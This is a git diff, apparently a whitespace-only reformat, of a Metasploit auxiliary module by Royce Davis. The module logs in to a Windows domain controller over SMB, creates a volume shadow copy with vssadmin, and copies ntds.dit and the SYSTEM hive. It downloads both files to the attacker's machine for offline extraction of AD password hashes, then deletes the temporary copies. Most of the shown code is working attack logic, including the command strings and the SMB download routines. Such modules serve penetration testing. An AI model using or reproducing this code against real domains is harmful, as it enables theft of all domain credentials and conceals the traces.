@@ -18,27 +18,27 @@ class Metasploit3 < Msf::Auxiliary
 
 
 	def initialize(info = {})
-         super(update_info(info,
-         	'Name'           => 'Windows Domain Controller - Download NTDS.dit and SYSTEM hive',
-         	'Description'    => %q{This module authenticates to an Active Directory Domain Controller and creates
-         		a volume shadow copy of the %SYSTEMDRIVE%.  It then pulls down copies of the ntds.dit file as well
-         		as the SYSTEM hive and stores them on your attacking machine.  The ntds.dit and SYSTEM copy can be used 
-         		in combination with other tools for offline extraction of AD password hashes.  All of this is possible without
-         		uploading a single binary to the target host.
-	         },
+		super(update_info(info,
+			'Name'           => 'Windows Domain Controller - Download NTDS.dit and SYSTEM hive',
+			'Description'    => %q{This module authenticates to an Active Directory Domain Controller and creates
+				a volume shadow copy of the %SYSTEMDRIVE%.  It then pulls down copies of the ntds.dit file as well
+				as the SYSTEM hive and stores them on your attacking machine.  The ntds.dit and SYSTEM copy can be used
+				in combination with other tools for offline extraction of AD password hashes.  All of this is possible without
+				uploading a single binary to the target host.
+			},
 
-	         'Author'         => [
-	         	'Royce Davis <rdavis[at]accuvant.com>',
-	         	'Twitter: <[at]R3dy__>',
-	         ],
- 
-	         'License'        => MSF_LICENSE,
-	         'References'     => [
-	         	[ 'URL', 'http://www.pentestgeek.com' ],
-	         	[ 'URL', 'http://www.accuvant.com' ],
-	         	[ 'URL', 'http://sourceforge.net/projects/smbexec.' ],
-	         ],
-	      ))
+			'Author'         => [
+				'Royce Davis <rdavis[at]accuvant.com>',
+				'Twitter: <[at]R3dy__>',
+			],
+
+			'License'        => MSF_LICENSE,
+			'References'     => [
+				[ 'URL', 'http://www.pentestgeek.com' ],
+				[ 'URL', 'http://www.accuvant.com' ],
+				[ 'URL', 'http://sourceforge.net/projects/smbexec.' ],
+			],
+		))
 
 		register_options([
 			OptString.new('SMBSHARE', [true, 'The name of a writeable share on the server', 'C$']),
@@ -48,9 +48,9 @@ class Metasploit3 < Msf::Auxiliary
 
 		deregister_options('RHOST')
 	end
-	
-	
-	
+
+
+
 	#---------------------------------
 	# This is the main control method
 	#---------------------------------
@@ -60,7 +60,7 @@ class Metasploit3 < Msf::Auxiliary
 		cmd = "C:\\WINDOWS\\SYSTEM32\\cmd.exe"
 		createvsc = "vssadmin create shadow /For=%SYSTEMDRIVE%"
 		logdir = datastore['LOGDIR']
-		
+
 		#Try and Connect to the target
 		begin
 			connect()
@@ -68,7 +68,7 @@ class Metasploit3 < Msf::Auxiliary
 			print_error("Unable to connect to the target: #{connecterror}")
 			return
 		end
-		
+
 		#Try and authenticate with given credentials
 		begin
 			smb_login()
@@ -76,9 +76,9 @@ class Metasploit3 < Msf::Auxiliary
 			print_error("Unable to authenticate with given credentials: #{autherror}")
 			return
 		end
-		
+
 		smbshare = datastore['SMBSHARE']
-		
+
 		begin
 			check_vss(smbshare, ip)
 			vscpath = make_volume_shadow_copy(smbshare, ip, cmd, createvsc, text, bat)
@@ -88,14 +88,14 @@ class Metasploit3 < Msf::Auxiliary
 			download_sys_hive(smbshare, "\\WINDOWS\\Temp\\sys", ip, logdir)
 			cleanup_after(smbshare, ip, cmd)
 			disconnect()
-		rescue 
+		rescue
 			# Something went terribly wrong
 			return
 		end
 	end
-	
-	
-	
+
+
+
 	#-----------------------------------------------------------------------------------
 	# Check if VSS is enabled on the target host
 	# As far as I can tell the VSS service doesn't need to acctually be running
@@ -109,9 +109,9 @@ class Metasploit3 < Msf::Auxiliary
 			return StandardError
 		end
 	end
-	
-	
-	
+
+
+
 	#-----------------------------------------------------------------------
 	# Create a Volume Shadow Copy on the target host
 	#-----------------------------------------------------------------------
@@ -140,15 +140,15 @@ class Metasploit3 < Msf::Auxiliary
 		print_good("Volume Shadow Copy created on #{vscpath}")
 		return vscpath
 	end
-	
-	
-	
+
+
+
 	#----------------------------------------------------------------------------------------------------------
 	# Copy ntds.dit from the Volume Shadow copy to the Windows Temp directory on the target host
 	#----------------------------------------------------------------------------------------------------------
 	def copy_ntds(smbshare, ip, cmd, vscpath)
 		print_status("Copying ntds.dit to Windows Temp directory")
-		begin 
+		begin
 			# Try to copy ntds.dit from VSC
 			ntdspath = vscpath.to_s + "\\WINDOWS\\NTDS\\ntds.dit"
 			command = "#{cmd} /C copy /Y #{ntdspath} C:\\WINDOWS\\Temp\\ntds"
@@ -159,9 +159,9 @@ class Metasploit3 < Msf::Auxiliary
 			return ntdscopyerror
 		end
 	end
-	
-	
-	
+
+
+
 	#-------------------------------------------------------------------------------------------
 	# Create a copy of the SYSTEM hive file and stores it in the Windows
 	# Temp directory on the target host
@@ -178,20 +178,20 @@ class Metasploit3 < Msf::Auxiliary
 			return hiveerror
 		end
 	end
-	
-	
-	
+
+
+
 	#-------------------------------------------------------------------
 	# Download the ntds.dit copy to your attacking machine
 	#-------------------------------------------------------------------
 	def download_ntds(smbshare, file, ip, logdir)
 		print_status("Downloading ntds.dit file")
-		begin 
+		begin
 			# Try to download ntds.dit
 			newdir = "#{logdir}/#{ip}"
 			::FileUtils.mkdir_p(newdir) unless ::File.exists?(newdir)
 			simple.connect("\\\\#{ip}\\#{smbshare}")
-			remotefile = simple.open("#{file}", 'rob')		
+			remotefile = simple.open("#{file}", 'rob')
 			data = remotefile.read
 			#Save it to local file system
 			file = File.open("#{logdir}/#{ip}/ntds", "w+")
@@ -204,9 +204,9 @@ class Metasploit3 < Msf::Auxiliary
 		end
 		simple.disconnect("\\\\#{ip}\\#{smbshare}")
 	end
-	
-	
-	
+
+
+
 	#----------------------------------------------------------------------
 	# Download the SYSTEM hive copy to your attacking machine
 	#----------------------------------------------------------------------
@@ -217,7 +217,7 @@ class Metasploit3 < Msf::Auxiliary
 			newdir = "#{logdir}/#{ip}"
 			::FileUtils.mkdir_p(newdir) unless ::File.exists?(newdir)
 			simple.connect("\\\\#{ip}\\#{smbshare}")
-			remotefile = simple.open("#{file}", 'rob')		
+			remotefile = simple.open("#{file}", 'rob')
 			data = remotefile.read
 			#Save it to local file system
 			file = File.open("#{logdir}/#{ip}/sys", "w+")
@@ -230,9 +230,9 @@ class Metasploit3 < Msf::Auxiliary
 			return sysdownloaderror
 		end
 	end
-	
-	
-	
+
+
+
 	#-----------------------------------------------------------------------------------------
 	# Delete the ntds.dit and SYSTEM hive copies from the Windows Temp directory
 	#-----------------------------------------------------------------------------------------
@@ -248,9 +248,9 @@ class Metasploit3 < Msf::Auxiliary
 			return deleteerror
 		end
 	end
-	
-	
-	
+
+
+
 	#-----------------------------------------------------
 	# Gets the path to the Volume Shadow Copy
 	#-----------------------------------------------------
@@ -262,14 +262,14 @@ class Metasploit3 < Msf::Auxiliary
 		output = outfile.read
 		output.each_line do |line|
 			vsc += line if line.include?("Volume Name:")
-		end 
+		end
 		outfile.close
 		simple.disconnect("\\\\#{ip}\\#{datastore['SMBSHARE']}")
 		return prepath + vsc.split("ShadowCopy")[1].chomp
 	end
-	
-	
-	
+
+
+
 	#------------------------------------------------------------------------------------------------------------------------
 	# This code was stolen straight out of psexec.rb.  Thanks very much for all who contributed to that module!!
 	# Instead of uploading and runing a binary.  This method runs a single windows command fed into the #{command} paramater
@@ -390,7 +390,7 @@ class Metasploit3 < Msf::Auxiliary
 		rescue ::Exception => e
 			print_error("Error: #{e}")
 		end
-			
+
 		begin
 			#print_status("Deleting \\#{filename}...")
 			select(nil, nil, nil, 1.0)
@@ -411,5 +411,5 @@ class Metasploit3 < Msf::Auxiliary
 		simple.disconnect("IPC$")
 		simple.disconnect(smbshare)
 	end
-	
+
 end
